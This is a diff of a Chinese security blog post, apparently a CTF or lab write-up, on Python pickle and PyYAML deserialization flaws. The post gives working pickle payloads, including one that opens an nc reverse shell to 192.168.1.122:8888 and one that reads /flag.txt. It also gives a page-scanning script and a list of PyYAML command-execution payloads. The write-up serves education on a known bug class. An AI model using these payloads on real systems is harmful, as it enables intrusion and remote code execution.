-        cmd <span class="token operator">=</span> <span class="token triple-quoted-string string">"""rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&amp;1 | nc 192.168.1.122 8888 >/tmp/f"""</span>  <span class="token comment">#要执行的命令</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#os.system("echo test >poc.txt")</span>
-
-e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
-poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>poc<span class="token punctuation">)</span>
-pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>poc<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        cmd = <span class="string">&quot;&quot;&quot;rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.1.122 8888 &gt;/tmp/f&quot;&quot;&quot;</span>  <span class="comment">#要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))        <span class="comment">#os.system(&quot;echo test &gt;poc.txt&quot;)</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line">pickle.loads(poc)</span><br></pre></td></tr></table></figure>
 
 <p>反弹成功</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210220165100857.png" alt="image-20210220165100857"></p>
@@ -317,19 +182,7 @@ pickle<span class="token punctuation">.</span>loads<span class="token punctuatio
 <p>且发现页面有注册有登陆功能</p>
 <p>尝试注册账户<code>greetdawn 123</code>，登陆后购买lv6  </p>
 <p>直接寻找lv6在哪里，简单的翻了几页，发现并无lv6，且url有page传参，既然这么不好找，那就写个脚本试一试</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment">#coding: utf-8</span>
-
-<span class="token keyword">import</span> requests
-
-
-
-<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	url <span class="token operator">=</span> <span class="token string">"http://192.168.1.191:8083/shop?page=&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-	r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
-	<span class="token keyword">if</span> <span class="token string">'lv6.png'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
-		<span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
-		<span class="token keyword">break</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2000</span>):</span><br><span class="line">	url = <span class="string">&quot;http://192.168.1.191:8083/shop?page=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">	r = requests.get(url)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;lv6.png&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 <p>运行找到lv6存在181页</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222151603695.png" alt="image-20210222151603695"></p>
@@ -358,21 +211,7 @@ pickle<span class="token punctuation">.</span>loads<span class="token punctuatio
 <h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>请求压缩包，获取到源码内容，在源码<code>Admin.py</code>中存在如下pickle反序列化代码</p>
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222154718086.png" alt="image-20210222154718086"></p>
 <p>抓取到become变量页面，编写payload的脚本</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment">#coding: utf-8</span>
-
-<span class="token keyword">import</span> pickle
-<span class="token keyword">import</span> commands
-<span class="token keyword">import</span> urllib
-
-<span class="token keyword">class</span> <span class="token class-name">genpoc</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""cat /flag.txt"""</span>  <span class="token comment">#要执行的命令</span>
-        <span class="token keyword">return</span> <span class="token punctuation">(</span>commands<span class="token punctuation">.</span>getoutput<span class="token punctuation">,</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token comment">#os.system("echo test >poc.txt")</span>
-
-e <span class="token operator">=</span> genpoc<span class="token punctuation">(</span><span class="token punctuation">)</span>
-poc <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>poc<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">genpoc</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        s = <span class="string">&quot;&quot;&quot;cat /flag.txt&quot;&quot;&quot;</span>  <span class="comment">#要执行的命令</span></span><br><span class="line">        <span class="keyword">return</span> (commands.getoutput, (s,))      <span class="comment">#os.system(&quot;echo test &gt;poc.txt&quot;)</span></span><br><span class="line"></span><br><span class="line">e = genpoc()</span><br><span class="line">poc = pickle.dumps(e)</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(poc))</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210222161340815.png" alt="image-20210222161340815"></p>
 <h2 id="PyYaml模块详解"><a href="#PyYaml模块详解" class="headerlink" title="PyYaml模块详解"></a>PyYaml模块详解</h2><h3 id="PyYaml基础"><a href="#PyYaml基础" class="headerlink" title="PyYaml基础"></a>PyYaml基础</h3><p>YAML是一种直观的能够被电脑识别的的数据序列化格式，容易被人类阅读，并且容易和脚本语言交互，YAML类似于XML，但是语法比XML简单得多，对于转化成数组或可以hash的数据时是很简单有效的。</p>
@@ -383,63 +222,26 @@ poc <span class="token operator">=</span> pickle<span class="token punctuation">
 <li>缩进的空格数目不重要，只要相同层级的元素左对齐即可</li>
 <li>‘#’表示注释，从它开始到行尾都被忽略</li>
 </ul>
-<pre class="language-none"><code class="language-none">yaml.load() : Python PyYAML 库版本 &lt; 5.1b1
-yaml.unsafe_load() : Python PyYAML 库版本 &gt;&#x3D; 5.1b1</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yaml.load() : Python PyYAML 库版本 &lt; 5.1b1</span><br><span class="line">yaml.unsafe_load() : Python PyYAML 库版本 &gt;= 5.1b1</span><br></pre></td></tr></table></figure>
 
 
 
 <h3 id="PyYaml中的格式"><a href="#PyYaml中的格式" class="headerlink" title="PyYaml中的格式"></a>PyYaml中的格式</h3><ul>
 <li>yaml转字典</li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
-
-<span class="token keyword">import</span> yaml
-
-data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
-name: greetdawn
-age: 19
-job: Player
-"""</span>
-
-a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">name: greetdawn</span></span><br><span class="line"><span class="string">age: 19</span></span><br><span class="line"><span class="string">job: Player</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = yaml.load(data)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093503733.png" alt="image-20210223093503733"></p>
 <ul>
 <li>yaml转列表</li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
-
-<span class="token keyword">import</span> yaml
-
-data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
-- greetdawn
-- 19
-- Player
-"""</span>
-
-a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- greetdawn</span></span><br><span class="line"><span class="string">- 19</span></span><br><span class="line"><span class="string">- Player</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = yaml.load(data)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223093654970.png" alt="image-20210223093654970"></p>
 <ul>
 <li>复合结构类型</li>
 </ul>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
-
-<span class="token keyword">import</span> yaml
-
-data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
-- name: greetdawn
-  age: 18
-  job: teacher
-- name: zhangsan
-  age: 40
-  job: player
-"""</span>
-
-a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">- name: greetdawn</span></span><br><span class="line"><span class="string">  age: 18</span></span><br><span class="line"><span class="string">  job: teacher</span></span><br><span class="line"><span class="string">- name: zhangsan</span></span><br><span class="line"><span class="string">  age: 40</span></span><br><span class="line"><span class="string">  job: player</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = yaml.load(data)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223094845756.png" alt="image-20210223094845756"></p>
 <ul>
@@ -450,17 +252,7 @@ a <span class="token operator">=</span> yaml<span class="token punctuation">.</s
 <li>强制类型转换</li>
 </ul>
 <p>单个感叹号( ! )通常用于强制转换为自定义类型 , 而两个感叹号( !! )通常用于强制转换为内置类型 . </p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
-
-<span class="token keyword">import</span> yaml
-
-data <span class="token operator">=</span> <span class="token triple-quoted-string string">"""
- string: !!str 3.1415926
- int: !!int "123456"
-"""</span>
-
-a <span class="token operator">=</span> yaml<span class="token punctuation">.</span>load<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> string: !!str 3.1415926</span></span><br><span class="line"><span class="string"> int: !!int &quot;123456&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = yaml.load(data)</span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223100750055.png" alt="image-20210223100750055"></p>
 <h3 id="PyYaml反序列化漏洞分析"><a href="#PyYaml反序列化漏洞分析" class="headerlink" title="PyYaml反序列化漏洞分析"></a>PyYaml反序列化漏洞分析</h3><ul>
@@ -490,17 +282,7 @@ a <span class="token operator">=</span> yaml<span class="token punctuation">.</s
 <p>根据代码我们可以发现，假设传入变量name的参数为os.system()，首先会尝试导入os模块，然后再判断os模块中是否存在指定的对象(system),如果该对象存在就将该对象返回。</p>
 <p>当函数返回后，python会动态调用该函数，那么用户输入的恶意指令会被拼接到动态调用的函数中</p>
 <p>简单的小例子</p>
-<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/local/env python</span>
-
-<span class="token keyword">import</span> os
-
-<span class="token keyword">class</span> <span class="token class-name">Poc1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-	<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
-		os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
-		
-obj <span class="token operator">=</span> Poc1<span class="token punctuation">(</span><span class="token punctuation">)</span>
-cls <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> <span class="token string">"shell"</span><span class="token punctuation">)</span>
-cls<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Poc1</span>():</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">shell</span>(<span class="params">self</span>):</span></span><br><span class="line">		os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">		</span><br><span class="line">obj = Poc1()</span><br><span class="line">cls = <span class="built_in">getattr</span>(obj, <span class="string">&quot;shell&quot;</span>)</span><br><span class="line">cls()</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210223165835716.png" alt="image-20210223165835716"></p>
 <h3 id="PyYaml反序列化漏洞利用"><a href="#PyYaml反序列化漏洞利用" class="headerlink" title="PyYaml反序列化漏洞利用"></a>PyYaml反序列化漏洞利用</h3><ul>
@@ -509,12 +291,7 @@ cls<span class="token punctuation">(</span><span class="token punctuation">)</sp
 <li>普通数据类型( 字符串 , 列表 , 元组 , 字典 )的反序列化过程是纯量初始化 , 赋值的过程，不会涉及到负责逻辑处理的代码块，也就不会有代码被调用执行 .</li>
 <li>因此 , 我们需要导入一个类 , 这个类存在一个包含恶意代码的函数 , 且该函数会被自动调用 . 我们将这个类序列化为字符串 , 再把这个字符串提交给 PyYAML 解析执行 .</li>
 </ul>
-<h3 id="常用payload汇总"><a href="#常用payload汇总" class="headerlink" title="常用payload汇总"></a>常用payload汇总</h3><pre class="language-python" data-language="python"><code class="language-python">!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span>calc<span class="token punctuation">.</span>exe<span class="token punctuation">]</span><span class="token punctuation">]</span>
-!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
-!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span><span class="token builtin">apply</span><span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span>
-!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>subprocess<span class="token punctuation">.</span>check_output <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
-!!python<span class="token operator">/</span><span class="token builtin">object</span><span class="token operator">/</span>new<span class="token punctuation">:</span>os<span class="token punctuation">.</span>system <span class="token punctuation">[</span><span class="token string">"calc.exe"</span><span class="token punctuation">]</span></code></pre>
+<h3 id="常用payload汇总"><a href="#常用payload汇总" class="headerlink" title="常用payload汇总"></a>常用payload汇总</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/<span class="built_in">object</span>/apply:subprocess.check_output [[calc.exe]]</span><br><span class="line">!!python/<span class="built_in">object</span>/apply:subprocess.check_output [<span class="string">&quot;calc.exe&quot;</span>]</span><br><span class="line">!!python/<span class="built_in">object</span>/apply:subprocess.check_output [[<span class="string">&quot;calc.exe&quot;</span>]]</span><br><span class="line">!!python/<span class="built_in">object</span>/apply:os.system [<span class="string">&quot;calc.exe&quot;</span>]</span><br><span class="line">!!python/<span class="built_in">object</span>/new:subprocess.check_output [[<span class="string">&quot;calc.exe&quot;</span>]]</span><br><span class="line">!!python/<span class="built_in">object</span>/new:os.system [<span class="string">&quot;calc.exe&quot;</span>]</span><br></pre></td></tr></table></figure>
 
 
 
